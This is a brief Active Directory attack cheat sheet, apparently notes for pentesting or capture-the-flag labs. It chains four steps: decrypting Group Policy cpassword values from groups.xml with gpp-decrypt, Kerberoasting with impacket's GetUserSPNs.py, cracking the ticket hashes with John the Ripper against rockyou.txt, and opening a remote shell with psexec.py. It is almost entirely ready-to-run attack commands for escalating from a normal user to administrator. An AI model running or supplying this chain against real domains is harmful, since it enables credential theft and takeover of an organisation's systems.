
### AD saves user informations in groups.xml file
```
name=username
cpassword=encrypted password
```

### Decrypt the cpassword using
```
gpp-decrypt <cpassword>
```

### If you get a normal user you can perform attack called Kerberoasting to get Administrator password,

use impacket GetUserSPNs.py to get administrator password hash
```
python3 GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip <IP> -request
```

Once you get the hash value user john the ripper to crack the password
```
john --wordlist=/usr/share/wordlists/rockyou.txt spn-crypt.txt
```

## If you able to crack the administrator password you can use impacket psexec script to get shell,
```
psexec.py domain/username:password@targetName
python3 psexec.py DOMAIN/USER:PASSWORD@10.10.10.20
```
